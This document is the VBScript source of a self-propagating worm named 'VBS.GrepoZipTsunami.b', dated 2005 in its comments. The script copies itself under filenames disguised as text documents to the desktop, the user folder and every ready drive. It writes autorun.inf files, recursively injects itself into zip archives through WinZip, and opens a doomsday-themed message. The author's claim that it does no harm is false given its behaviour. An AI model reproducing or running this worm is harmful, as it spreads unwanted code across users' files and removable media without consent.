' VBS.GrepoZipTsunami.b
' My first (second, updated) VBS worm. Padding itself into a zip file!
' Don't worry, it won't do harm to you.. I promise.
' SealNight5, Asmaradana
' MVS, USM, Malaysia.
' 2005-01-10 (Updated)

On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set tsunami = Fso.GetFile(WScript.ScriptFullName)
desktoppath = ws.specialFolders("Desktop")
accountpath = left(desktoppath, (len(desktoppath) - 8))
tsunami.Copy (accountpath & "\PleaseReady1st.txt.vbs")
tsunami.Copy (desktoppath & "\Tsunami - A must read - God's total avenge.txt.vbs")
Set Drives = Fso.Drives

ret = Chr(13)
tsu1 = "It is God's total avenge!" & ret
tsu2 = "To those people who did bad on earth..." & ret
tsu3 = "God has promised, that He will give lesson," & ret
tsu4 = "and this is a promise that the End of Day" & ret
tsu5 = "is just not too far ahead!" & ret & ret
tsu6 = "Pray, do good and may God bless you!" & ret & ret
tsu7 = "Tell and share this message with everyone who has faith in God."

tsunamimsg = accountpath & "\tsunami.txt"
Set msgt = Fso.Createtextfile(tsunamimsg, True)
msgt.writeline tsu1 & tsu2 & tsu3 & tsu4 & tsu5 & tsu6 & tsu7
msgt.Close
ws.run tsunamimsg

For Each Drive In Drives
If Drive.isready Then
    On Error Resume Next
    tsunami.Copy(drive&"\Tsunami - A must read - God's total avenge.txt.vbs")
    tsunami.Copy(drive&"\PleaseReady1st.txt.vbs")
    
    tsunamirun = Drive & "autorun.inf"
    Set autorun = Fso.Createtextfile(tsunamirun, True)
    autorun.writeline "PleaseReady1st.txt.vbs"
    autorun.Close
    
    SearchWinZip Drive & "\"
End If
Next

Function SearchWinZip(path)
    On Error Resume Next
    winzipexist = 1
    
    Set ws = CreateObject("wscript.shell")
    If ws.RegREAD("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\") = "" Then
        winzipexist = 0
    End If
    
    If winzipexist = 1 Then
    
    Set folder = Fso.getfolder(path)
    Set Files = folder.Files
    
    For Each file In Files

    If Fso.GetExtensionName(file.path) = "zip" Then
        Set ws = CreateObject("wscript.shell")
        desktoppath = ws.specialFolders("Desktop")
	accountpath = left(desktoppath, (len(desktoppath) - 8))
        winzippath = ws.RegREAD("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\winzip.exe\")
        ws.run winzippath & " -a -r " & file.path & " " & accountpath & "\PleaseReady1st.txt.vbs"
    End If
    Next
        
    Set Subfolders = folder.Subfolders
    
    For Each Subfolder In Subfolders
        SearchWinZip Subfolder.path
    Next
    
    End If
End Function